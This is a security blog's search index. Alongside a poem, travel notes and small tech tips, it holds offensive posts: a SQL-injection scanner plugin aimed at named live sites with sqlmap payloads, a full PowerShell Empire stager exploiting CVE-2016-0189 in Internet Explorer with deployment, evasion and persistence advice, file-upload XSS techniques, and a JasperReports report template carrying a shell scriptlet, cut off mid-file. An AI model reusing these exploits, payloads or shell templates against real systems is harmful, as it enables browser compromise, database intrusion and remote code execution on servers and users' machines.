<?xml version="1.0" encoding="utf-8"?>
<search>
  
    
    <entry>
      <title><![CDATA[PORT=>服务/漏洞]]></title>
      <url>%2F2017%2F01%2F24%2FPORT-%E6%9C%8D%E5%8A%A1-%E6%BC%8F%E6%B4%9E%2F</url>
      <content type="text"><![CDATA[范围：0-65535固定端口：0-1023 1024保留动态端口：1024-65535 常用端口21：FTP(爆破) 22：SSH(爆破) 23：Telnet(爆破) 25：SMTP 53：DNS（UDP） 69：TFTP（cisco，类似FTP） 79：Finger 80：HTTP 110：POP3 111：RPC 远程过程调用 113：windows 验证服务 119：NNTP 网络新闻组传输协议 135：RPC 远程过程调用 137：NetBIOS 139：windows文件和打印机共享，Unix中的samba服务 161：SNMP 简单网络管理协议 389：LDAP 443：HTTPS 445：SMB 1080：socks代理服务 2082/2083 cpanel主机管理系统登陆 (国外用较多) 2222 DA虚拟主机管理系统登陆 (国外用较多) 2601,2604：zebra路由，默认密码zebra 3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 3312/3311 kangle主机管理系统登陆 3389:远程桌面 4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 5900：vnc 6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 7001,7002 WebLogic默认弱口令，反序列 8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 8080：用户www代理服务,tomcat/WDCP主机管理系统，默认弱口令 8080,8089,9090 JBOSS 8083 Vestacp主机管理系统 （国外用较多） 8649 ganglia 8888 amh/LuManager 主机管理系统默认端口 9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 10000 Virtualmin/Webmin 服务器虚拟主机管理系统 11211 memcache未授权访问 27017,27018 Mongodb未授权访问 28017 mongodb统计页面 50000 SAP命令执行 50070,50030 hadoop默认端口未授权访问 木马病毒5554：worm.Sasser病毒利用端口7626：冰河病毒8011：WAY2.4病毒7306：Netspy3.0病毒1024：YAI病毒 中间件7001,7002：weblogic9080：webshpere应用程序9090：webshpere管理工具8080：tomcat默认端口Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093，默认为8080 数据库3306：mysql1433：mssqlserver1434：sqlserver monitor1521：oracle:(iSqlPlus Port:5560,7778)5432：PostgreSQL1158：ORACLE EMCTL8080：Oracle XDB2100：Oracle XDB FTP 特殊服务（漏洞）443：SSL心脏滴血 512,513,514：Rsync未授权访问 873：Rsync未授权访问 1025,111 NFS 2375：docker remote api漏洞 50000：SAP命令执行 5984：CouchDB http://xxx:5984/_utils/ 6379：redis未授权 7001,7002：WebLogic 默认弱口令，反序列化 9200,9300：elasticsearch未授权访问 11211：memcache未授权访问 27017,27018：Mongodb 未授权访问28017：mongodb统计页面]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[TO HER]]></title>
      <url>%2F2017%2F01%2F23%2FTO-HER%2F</url>
      <content type="text"><![CDATA[질량의 크기는 부피와 비례하지 않는다.重量和大小不成比例제비꽃 같은 조그만한 그 계집애가像紫罗兰一般幼小的那丫头꽃잎같이 하늘거리는 그계집애가像花瓣一般轻曳的那丫头지구보다 더 큰 질량으로 나를 끌어당긴다.以超过地球的重量吸引着我순간瞬间，我나는 뉴턴의 사과 처럼就如同牛顿的苹果一样사정없이 그녀에게로 굴러 떨어졌다.不受控制的向她掉落滚去쿵 소리를 내며 쿵쿵 소리를 내며咚的一声 咚咚作响심장이 하늘에서 땅까지心脏 自天上到地下아찔한 진자운동을 계속하였다.持续着令人眩晕的摇摆运动사랑이었다.原来这就是是初恋啊]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[BugScan插件编写]]></title>
      <url>%2F2017%2F01%2F22%2FBugScan%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%2F</url>
      <content type="text"><![CDATA[最近四叶草又开始招收实习了，所以某个妹子就投了简历。不久四叶草发来一个题目要妹子完成。So？这意味着什么，这意味着一个泡妹子的好时机来了啊。哈哈哈…… 下面就让我们看看这个题目： 某通用平台被曝出有一处高危注入，以下为详情： 1http://www.exploit.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1 userName处为一处报错注入， 请使用python编写一个通用脚本检测该处注入点(可使用任何python库)，要求测试该脚本必须使用多个目标站点。以下为两个测试站点（请勿做除测试之外的任何危险动作） 12http://www.jmsyzx.com/http://www.globechildren.com/ 哎呦，不限制python库，一个通用脚本。刚跟室友开黑了一下守望先锋（挺好玩儿的，有兴趣一起啊）的我刚看也是一脸懵逼，总之刚开始想的太多了，但其实也就是一个插件的事情（还是range一棒打醒我，所以以后还是干完正事再开黑）。 看了一下是mssql数据库，并且是报错注入。我们可以手工构造看数据库类型： 1http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=@@version-- 也可以sqlmap跑一下看看： 1234567891011121314151617181920[22:07:32] [INFO] resuming back-end DBMS &apos;microsoft sql server&apos;[22:07:32] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: userName (GET)Type: error-basedTitle: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clausePayload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos; AND 2390=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (2390=2390) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(112)+CHAR(118)+CHAR(113))) AND &apos;nTAv&apos;=&apos;nTAvType: stacked queriesTitle: Microsoft SQL Server/Sybase stacked queries (comment)Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos;;WAITFOR DELAY &apos;0:0:5&apos;--Type: AND/OR time-based blindTitle: Microsoft SQL Server/Sybase time-based blind (comment)Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos; WAITFOR DELAY &apos;0:0:5&apos;-----[22:07:33] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2005[22:07:33] [INFO] fetched data logged to text files under &apos;C:\Users\ZEROYU\.sqlmap\output\www.jmsyzx.com&apos; 别多看看那个GET就行了，GET最简单了。我们就抓住报错跟打印MD5这两点就行了。 打印MD5呢，mssql有两种方式： 1231.http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27))--2.http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))-- 直接上我写的脚本： 12345678910111213141516171819202122#!/usr/bin/evn python#-*-:coding:utf-8 -*-"""POC Name : 泡妹专享Author : zeroyumail : zeroyu.xyz@gmail.com"""import hackhttpimport timedef assign(service, arg): if service == 'fingerprint.girl': return True, argdef audit(arg): payload = "/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--" url = arg + payload code, head, res, errcode, _ = hackhttp.http(url) time.sleep(1) if code == 500 and '81dc9bdb52d04dc20036dbd8313ed055' in res: security_hole(url)if __name__=='__main__': from dummy import * audit(assign('fingerprint.girl','http://www.jmsyzx.com/')[1]) 是不是想问我hackhttp是个什么库，看文档去。 好，今天妹子就泡到这儿。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[POWERSHELL EMPIRE + CVE-2016-0189 = PROFIT]]></title>
      <url>%2F2017%2F01%2F22%2FPOWERSHELL-EMPIRE-CVE-2016-0189-PROFIT%2F</url>
      <content type="text"><![CDATA[​ Powershell Empire 是我们在渗透目标用户时一直都很喜欢的工具之一，虽然我们通常都是用Metaspolit和Empire来一起完成工作，使浏览器漏洞和经验结合在Empire中。在最近的一次测试中我们没有选择去使用MSF，相反我们和一个新的“经验丰富”的Empire一起利用CVE-2016-0189（也就是vbscrupt_godmode）其攻击使用IE9—11的用户。Empire是近6个月来我们首选的使用并且最近开始打造漏洞工具箱。如果成功，powershell将会登录并通过一个代理链接到Empire。重要的是硬盘上不会留下任何信息。from lib.common import helpersclass Stager: def __init__(self, mainMenu, params=[]): self.info = &#123; 'Name': 'MS16-051 IE RCE', 'Author': ['www.cgsec.co.uk'], 'Description': ('Leverages MS16-051 to execute powershell in unpatched browsers. This is a file-less vector which works on IE9/10/11 and all versions of Windows'), 'Comments': [ 'Target will have to open link with vulnerable version of IE.' ] &#125; # any options needed by the stager, settable during runtime self.options = &#123; # format: # value_name : &#123;description, required, default_value&#125; 'Listener' : &#123; 'Description' : 'Listener to generate stager for.', 'Required' : True, 'Value' : '' &#125;, 'StagerRetries' : &#123; 'Description' : 'Times for the stager to retry connecting.', 'Required' : False, 'Value' : '0' &#125;, 'OutFile' : &#123; 'Description' : 'File to output HTML to, otherwise displayed on the screen.', 'Required' : True, 'Value' : '' &#125;, 'Base64' : &#123; 'Description' : 'Switch. Base64 encode the powershell output.', 'Required' : True, 'Value' : 'True' &#125;, 'UserAgent' : &#123; 'Description' : 'User-agent string to use for the staging request (default, none, or other).', 'Required' : False, 'Value' : 'default' &#125;, 'Proxy' : &#123; 'Description' : 'Proxy to use for request (default, none, or other).', 'Required' : False, 'Value' : 'default' &#125;, 'ProxyCreds' : &#123; 'Description' : 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).', 'Required' : False, 'Value' : 'default' &#125; &#125; # save off a copy of the mainMenu object to access external functionality # like listeners/agent handlers/etc. self.mainMenu = mainMenu for param in params: # parameter format is [Name, Value] option, value = param if option in self.options: self.options[option]['Value'] = value def generate(self): # extract all of our options listenerName = self.options['Listener']['Value'] base64 = self.options['Base64']['Value'] userAgent = self.options['UserAgent']['Value'] proxy = self.options['Proxy']['Value'] proxyCreds = self.options['ProxyCreds']['Value'] stagerRetries = self.options['StagerRetries']['Value'] encode = False if base64.lower() == "true": encode = True # generate the launcher code launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries) if launcher == "": print helpers.color("[!] Error in launcher command generation.") return "" else: code = "&lt;html&gt;\n" code += "&lt;head&gt;\n" code += "&lt;meta http-equiv=\"x-ua-compatible\" content=\"IE=10\"&gt;\n" code += "&lt;/head&gt;\n" code += "&lt;body&gt;\n" code += " &lt;script type=\"text/vbscript\"&gt;\n" code += " Dim aw\n" code += " Dim plunge(32)\n" code += " Dim y(32)\n" code += " prefix = \"%u4141%u4141\"\n" code += " d = prefix &amp; \"%u0016%u4141%u4141%u4141%u4242%u4242\"\n" code += " b = String(64000, \"D\")\n" code += " c = d &amp; b\n" code += " x = UnEscape(c)\n" code += " \n" code += " Class ArrayWrapper\n" code += " Dim A()\n" code += " Private Sub Class_Initialize\n" code += " ReDim Preserve A(1, 2000)\n" code += " End Sub\n" code += " \n" code += " Public Sub Resize()\n" code += " ReDim Preserve A(1, 1)\n" code += " End Sub\n" code += " End Class\n" code += " \n" code += " Class Dummy\n" code += " End Class\n" code += " \n" code += " Function getAddr (arg1, s)\n" code += " aw = Null\n" code += " Set aw = New ArrayWrapper\n" code += " \n" code += " For i = 0 To 32\n" code += " Set plunge(i) = s\n" code += " Next\n" code += " \n" code += " Set aw.A(arg1, 2) = s\n" code += " \n" code += " Dim addr\n" code += " Dim i\n" code += " For i = 0 To 31\n" code += " If Asc(Mid(y(i), 3, 1)) = VarType(s) Then\n" code += " addr = strToInt(Mid(y(i), 3 + 4, 2))\n" code += " End If\n" code += " y(i) = Null\n" code += " Next\n" code += " \n" code += " If addr = Null Then\n" code += " document.location.href = document.location.href\n" code += " Return\n" code += " End If\n" code += " getAddr = addr\n" code += " End Function\n" code += " \n" code += " Function leakMem (arg1, addr)\n" code += " d = prefix &amp; \"%u0008%u4141%u4141%u4141\"\n" code += " c = d &amp; intToStr(addr) &amp; b\n" code += " x = UnEscape(c)\n" code += " \n" code += " aw = Null\n" code += " Set aw = New ArrayWrapper\n" code += " \n" code += " Dim o\n" code += " o = aw.A(arg1, 2)\n" code += " \n" code += " leakMem = o\n" code += " End Function\n" code += " \n" code += " Sub overwrite (arg1, addr)\n" code += " d = prefix &amp; \"%u400C%u0000%u0000%u0000\"\n" code += " c = d &amp; intToStr(addr) &amp; b\n" code += " x = UnEscape(c)\n" code += " \n" code += " aw = Null\n" code += " Set aw = New ArrayWrapper\n" code += " \n" code += " \n" code += " aw.A(arg1, 2) = CSng(0)\n" code += " End Sub\n" code += " \n" code += " Function exploit (arg1)\n" code += " Dim addr\n" code += " Dim csession\n" code += " Dim olescript\n" code += " Dim mem\n" code += " \n" code += " \n" code += " Set dm = New Dummy\n" code += " \n" code += " addr = getAddr(arg1, dm)\n" code += " \n" code += " mem = leakMem(arg1, addr + 8)\n" code += " csession = strToInt(Mid(mem, 3, 2))\n" code += " \n" code += " mem = leakMem(arg1, csession + 4)\n" code += " olescript = strToInt(Mid(mem, 1, 2))\n" code += " overwrite arg1, olescript + &amp;H174\n" code += " Set Object = CreateObject(\"Wscript.Shell\")\n" code += " Object.run(\"" code += launcher + "\")\n" code += " End Function\n" code += " \n" code += " Function triggerBug\n" code += " aw.Resize()\n" code += " Dim i\n" code += " For i = 0 To 32\n" code += " ' 24000x2 + 6 = 48006 bytes\n" code += " y(i) = Mid(x, 1, 24000)\n" code += " Next\n" code += " End Function\n" code += " &lt;/script&gt;\n" code += " \n" code += " &lt;script type=\"text/javascript\"&gt;\n" code += " function strToInt(s)\n" code += " &#123;\n" code += " return s.charCodeAt(0) | (s.charCodeAt(1) &lt;&lt; 16);\n" code += " &#125;\n" code += " function intToStr(x)\n" code += " &#123;\n" code += " return String.fromCharCode(x &amp; 0xffff) + String.fromCharCode(x &gt;&gt; 16);\n" code += " &#125;\n" code += " var o;\n" code += " o = &#123;\"valueOf\": function () &#123;\n" code += " triggerBug();\n" code += " return 1;\n" code += " &#125;&#125;;\n" code += " setTimeout(function() &#123;exploit(o);&#125;, 50);\n" code += " &lt;/script&gt;\n" code += "&lt;/body&gt;\n" code += "&lt;/html&gt;" return code ms16.py 首先我们可以从Github获取Empire 现在我们已经下载了Empire，接下来我们要安装apache2以便于我们把索引页面直接放到/var/www/html路径下。这一步是可选的，因为大多数人都想改变输出位置，模糊它来逃避杀毒引擎或者类似的产品。 接下来该添加我们的新规则了。这需要将脚本放在/lib/stagers下并且运行Empire的install.sh脚本去添加并运行它。如果你的运行在Ubuntu环境中，你可能要在运行这些脚本之前去安装pip。 现在我们已经准备好并要第一次去启动Empire了。如果一切都顺利的话我们应该可以去使用我们添加的ms16脚本、设置我们的输出文件到/var/www/html/index.html并且放置直接目标到其中。更高级的用户可能想要去设置一些稍微复杂的到服务中来利用不同客户或不同的向量来混淆视听，这些就已经超出本文要描述的范围了。 我个人更偏向于设置443端口的监听以期bypass一些防火墙并逃避一些检测机制。 现在去生成我们的恶意HTML 现在当你的服务被某个使用带有相关漏洞浏览器的用户浏览的时候，这个攻击载荷将被触发同时你将看到一个新的代理在Empire中。使用持久性模块创建任务通常是个好注意，相似的也可以确保你不因为重新启动而丢失权限。这些可以通过设置自动运行的代理从而设置为自动运行一个新的客户端连接。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XSS姿势——文件上传XSS]]></title>
      <url>%2F2017%2F01%2F22%2FXSS%E5%A7%BF%E5%8A%BF%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0XSS%2F</url>
      <content type="text"><![CDATA[0x01 简单介绍 一个文件上传点是执行XSS应用程序的绝佳机会。很多网站都有用户权限上传个人资料图片的上传点，你有很多机会找到相关漏洞。如果碰巧是一个self XSS，你可以看看这篇文章。 0x02 实例分析 首先基本上我们都可以找到类似下面的一个攻击入口点，我觉得这个并不难。 姿势一：文件名方式文件名本身可能会反映在页面所以一个带有XSS命名的文件便可以起到攻击作用。 虽然我没有准备靶场，但是你可以选择在W3Schools练习这种XSS 。 姿势二：Metadata使用exiftool这个工具可以通过改变EXIF metadata进而一定几率引起某处反射： 例如： 姿势三：Content如果应用允许上传SVG格式的文件（其实就是一个图像类型的），那么带有以下content的文件可以被用来触发XSS： 一个 PoC用来验证。你可以通过访问brutelogic.com.br/poc.svg看到效果 姿势四：Source建立一个携带有JavaScript payload的GIF图像用作一个脚本的源。这对绕过CSP（内容安全策略）保护“script-src ‘self’”（即不允许使用示例的这种xss方式进行攻击alert(1)）是很有用的，但前提是我们能够成功地在相同的域注入，如下所示。 要创建这样的图像需要这个作为content 和 name，并使用.gif扩展名： 这个GIF的图片头——GIF89a，作为alert function的变量分配给alert function。但是他们之间，还有一个被标注的XSS变量用来防止图片被恢复为text/HTML MIME文件类型，因此只需发送一个对这个文件的请求payload 就可以被执行。 正如我们下面看到的，文件类unix命令和PHP函数中的exif_imagetype（）和getimagesize（）会将其识别为一个GIF文件。所以如果一个应用程序仅仅是使用这些方式验证是否是一个图像，那么该文件将可以上传成功（但可能在上传后被杀掉）。 0x03 最后 如果你想知道更多的有其标志性ASCII字符可以用于一个javascript变量赋值的文件类型，看我随后的文章。 也有很多比较详细的使用XSS和图像文件相结合绕过图形处理函数库过滤的例子。这方面的一个很好的例子是here 原文链接：http://brutelogic.com.br/blog/]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PNG文件中的LSB隐写]]></title>
      <url>%2F2017%2F01%2F22%2FPNG%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84LSB%E9%9A%90%E5%86%99%2F</url>
      <content type="text"><![CDATA[看到MottoIn的一篇文章时关于LSB隐写的，正好赶上中秋攒了一堆月饼没处放，就想由此出个题送送月饼。 环境：win10 python27 lsb脚本使用了https://github.com/cyberinc/cloacked-pixel 在使用之前需要几个python包，主要说下win10下如何安装这些包 1.PIL 这个包你按廖雪峰官网上的方法可能安装不上，所以我给出我自己的解决办法： 到https://pypi.python.org/pypi/Pillow/2.7.0找到exe安装包双击 主要是PIL官方编译包有bug，所以最好下载第三方组织编译包，强烈推荐pillow的确好用 2.matplotlib 这个包的安装直接参考官方网站的方法，注意一步一步来。 123456python -m pip install --upgrade pippython -m pip install --upgrade numpypython -m pip install --upgrade pytzpython -m pip install --upgrade pyparsingpython -m pip install --upgrade cyclerpython -m pip install --upgrade matplotlib 这就ok了，很简单。 接下来按照MottoIn这个玩就好了。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[win10只有edge可以打开网页]]></title>
      <url>%2F2017%2F01%2F22%2Fwin10%E5%8F%AA%E6%9C%89edge%E5%8F%AF%E4%BB%A5%E6%89%93%E5%BC%80%E7%BD%91%E9%A1%B5%2F</url>
      <content type="text"><![CDATA[按住win+x 然后选择“命令提示符（管理员）” 输入 netsh winsock reset 重启就好了。。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[figlet--一款很好用的生成字符画的工具]]></title>
      <url>%2F2017%2F01%2F22%2Ffiglet-%E4%B8%80%E6%AC%BE%E5%BE%88%E5%A5%BD%E7%94%A8%E7%9A%84%E7%94%9F%E6%88%90%E5%AD%97%E7%AC%A6%E7%94%BB%E7%9A%84%E5%B7%A5%E5%85%B7%2F</url>
      <content type="text"><![CDATA[安装： 1apt-get install figlet]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[北京之行的感悟]]></title>
      <url>%2F2017%2F01%2F22%2F%E5%8C%97%E4%BA%AC%E4%B9%8B%E8%A1%8C%E7%9A%84%E6%84%9F%E6%82%9F%2F</url>
      <content type="text"><![CDATA[​ 已经很晚了，一般是不写这种文章的，但这次去北京的确有很多收获和感悟，所以想在此记录一下。 ​ 这次北京之行的路演，依旧按照平时的答辩模式，最终也取得了不错的效果。百度的负责人对我们团队印象很深，也是三人团队的配合还不错，所以 最终也取得了不错的成绩。当然这次收获最大的并不是我们团队的表现，而是其它大学的。北邮的乐享奇迹科技有限公司给我的印象很深，他们有一个很完善的团队组织架构，并且基于一个预约平台衍生出了很多APP；还有第二组那个研究生基于原来学长的东西进一步完善，这也是一个思路；而后就是那个博士生的盲人系统，很有想法；最后是那个外卖APP，市场调查做的很详细。 ​ 总之，我觉得，对于社团而言也可以开发一些这种核心的东西作为一种积累；还有就是成立公司。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hacking JasperReports-隐藏shell的特征]]></title>
      <url>%2F2017%2F01%2F22%2FHacking-JasperReports-%E9%9A%90%E8%97%8Fshell%E7%9A%84%E7%89%B9%E5%BE%81%2F</url>
      <content type="text"><![CDATA[不久前，我的同事跟我在对一个客户端进行渗透测试。我们确实发现的一件事是,他们留下了几个联网的JasperReports服务器。寻找默认管理帐户的用户名并没有花费太多的精力。 也没有用多久我们就猜解出密码是“jasperadmin” 我从前听过JasperReports但从来没有碰到过要对它进行渗透测试。一个快速的google搜索也没有对前期工作产生多大的作用。尽管这个管理界面很不常见但是它也没有摆脱以某种方式来执行代码，所以顺利成章的我们开始在渗透旅程中把JasperReports渗透测试添加进“容易成功”的列表。 代码和小脚本JasperReports的目的是提取数据从各种各样的来源，例如：databases, xml, flat files等等，并且基于用户定义的模板用某种方式生成一份漂亮的报告。模板在JasperReports被定义为“JRXML”文件，任何拥有创建编辑报告权限的用户都可以上传它。 JasperReports的设计者允许数据在被包含在报告之前自定义操作。接下来就是利用一些小技巧用Java来编写一段脚本！我想也许你会看到这个。 我们的目标呢，就是创建一个报告模板（JRXML file）当然是依旧定制的恶意脚本，当它运行时，我们可以收到一个shell。这篇文章的其余部分将会详细描述我们是如何将脚本和报告模板联系到一起的。 编辑模板我们仅仅编辑一个存在的模板而不是创建一个。以下是我们将使用的模板。注意一下，过于复杂以及其中的90%是完全不必要的。下面这个只是一个带有“JasperStudio”的简单样本报告。35–42行是有趣的一个部分，我在这个部分插入了“ShellScriptlet”。 shell.jrxml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!-- Created with Jaspersoft Studio version 6.0.1.final using JasperReports Library version 6.0.0 --&gt;&lt;!-- 2016-10-04T14:01:12 --&gt;&lt;jasperReport xmlns="http://jasperreports.sourceforge.net/jasperreports" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd" name="AllAccounts" pageWidth="595" pageHeight="842" whenNoDataType="AllSectionsNoDetail" columnWidth="515" leftMargin="40" rightMargin="40" topMargin="50" bottomMargin="50" isSummaryWithPageHeaderAndFooter="true" uuid="17f4b3c5-e096-4a65-b030-ed3bb58ce311"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.language" value="EN-US"/&gt;&lt;style name="Sans_Normal" isDefault="true" fontName="DejaVu Sans" fontSize="12"/&gt;&lt;style name="Sans_Bold" fontName="DejaVu Sans" fontSize="12" isBold="true"/&gt;&lt;style name="Sans_Italic" fontName="DejaVu Sans" fontSize="12" isItalic="true"/&gt;&lt;style name="PageHeader" style="Sans_Bold" forecolor="#FFFFFF" backcolor="#333333"/&gt;&lt;style name="detail" fontName="DejaVu Sans" fontSize="12"&gt;&lt;conditionalStyle&gt;&lt;conditionExpression&gt;&lt;![CDATA[new Boolean($V&#123;CityGroup_COUNT&#125;.intValue() % 2 == 0)]]&gt;&lt;/conditionExpression&gt;&lt;style mode="Opaque" backcolor="#E0E0E0"/&gt;&lt;/conditionalStyle&gt;&lt;/style&gt;&lt;subDataset name="Table Dataset 1" uuid="4fcc1d09-9859-48ee-bb6f-8d369bd49113"&gt;&lt;queryString&gt;&lt;![CDATA[SELECT name, phone_office, billing_address_city, billing_address_street, billing_address_country FROM accounts ORDER BY billing_address_country, billing_address_city]]&gt;&lt;/queryString&gt;&lt;field name="name" class="java.lang.String"/&gt;&lt;field name="phone_office" class="java.lang.String"/&gt;&lt;field name="billing_address_city" class="java.lang.String"/&gt;&lt;field name="billing_address_street" class="java.lang.String"/&gt;&lt;field name="billing_address_country" class="java.lang.String"/&gt;&lt;sortField name="billing_address_country"/&gt;&lt;sortField name="billing_address_city"/&gt;&lt;variable name="CityyNumber" class="java.lang.Integer" incrementType="Group" incrementGroup="CityGroup" calculation="Count"&gt;&lt;variableExpression&gt;&lt;![CDATA[Boolean.TRUE]]&gt;&lt;/variableExpression&gt;&lt;initialValueExpression&gt;&lt;![CDATA[new Integer(0)]]&gt;&lt;/initialValueExpression&gt;&lt;/variable&gt;&lt;group name="CityGroup"&gt;&lt;groupExpression&gt;&lt;![CDATA[$F&#123;billing_address_city&#125;]]&gt;&lt;/groupExpression&gt;&lt;/group&gt;&lt;/subDataset&gt;&lt;scriptlet name="ShellScriptlet" class="foxglove.shell.ShellScriptlet"&gt;&lt;scriptletDescription&gt;&lt;![CDATA[]]&gt;&lt;/scriptletDescription&gt;&lt;/scriptlet&gt;&lt;title&gt;&lt;band height="79" splitType="Stretch"&gt;&lt;textField&gt;&lt;reportElement x="227" y="20" width="100" height="30" uuid="32a2a8ff-d90a-48d7-b044-5325b5c6264f"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA[$P&#123;ShellScriptlet_SCRIPTLET&#125;.getShell()]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/band&gt;&lt;/title&gt;&lt;pageFooter&gt;&lt;band height="40"&gt; &lt;line&gt;&lt;reportElement x="0" y="10" width="515" height="1" uuid="19826638-0487-4bb5-9b15-7e7af63b8dce"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.table" value="end"/&gt;&lt;/reportElement&gt;&lt;/line&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement x="200" y="20" width="80" height="16" uuid="6f072af1-756c-49f4-82f3-af59e8124296"/&gt;&lt;textElement textAlignment="Right"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA["Page " + String.valueOf($V&#123;PAGE_NUMBER&#125;) + " of"]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;textField isStretchWithOverflow="true" evaluationTime="Report"&gt;&lt;reportElement x="280" y="20" width="75" height="16" uuid="02b15e9e-d360-4b82-a140-54b9bd3b0e81"/&gt;&lt;textElement textAlignment="Left"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA[" " + String.valueOf($V&#123;PAGE_NUMBER&#125;)]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/band&gt;&lt;/pageFooter&gt;&lt;summary&gt;&lt;band height="149" splitType="Stretch"&gt;&lt;image scaleImage="Clip" hAlign="Right" vAlign="Middle" onErrorType="Icon"&gt;&lt;reportElement positionType="Float" x="0" y="71" width="250" height="70" uuid="aa8a8976-039f-45ac-84f3-d8d55b442410"/&gt;&lt;imageExpression&gt;&lt;![CDATA["repo:LogoLink"]]&gt;&lt;/imageExpression&gt;&lt;hyperlinkTooltipExpression&gt;&lt;![CDATA["JasperReports Logo"]]&gt;&lt;/hyperlinkTooltipExpression&gt;&lt;/image&gt;&lt;image scaleImage="Clip" hAlign="Right" vAlign="Middle" onErrorType="Icon"&gt;&lt;reportElement positionType="Float" x="265" y="71" width="250" height="70" uuid="4b5dd0d1-9011-42cf-ab07-f80c02d3d166"/&gt;&lt;imageExpression&gt;&lt;![CDATA["repo:AllAccounts_Res2"]]&gt;&lt;/imageExpression&gt;&lt;hyperlinkTooltipExpression&gt;&lt;![CDATA["Jaspersoft Logo"]]&gt;&lt;/hyperlinkTooltipExpression&gt;&lt;/image&gt;&lt;componentElement&gt;&lt;reportElement key="table" x="0" y="0" width="515" height="70" uuid="db3dd84a-3743-43b3-ab7e-c4aebdb907df"/&gt;&lt;jr:table xmlns:jr="http://jasperreports.sourceforge.net/jasperreports/components" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports/components http://jasperreports.sourceforge.net/xsd/components.xsd" whenNoDataType="AllSectionsNoDetail"&gt;&lt;datasetRun subDataset="Table Dataset 1" uuid="3b2a079f-f600-46a6-a7af-720c4e939e7e"&gt;&lt;connectionExpression&gt;&lt;![CDATA[$P&#123;REPORT_CONNECTION&#125;]]&gt;&lt;/connectionExpression&gt;&lt;/datasetRun&gt;&lt;jr:columnGroup width="515" uuid="1e5d630a-c8f9-4dbb-8415-393f7624ca35"&gt;&lt;jr:groupHeader groupName="CityGroup"&gt;&lt;jr:cell height="30" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="Sans_Bold" positionType="Float" mode="Opaque" x="0" y="14" width="515" height="16" 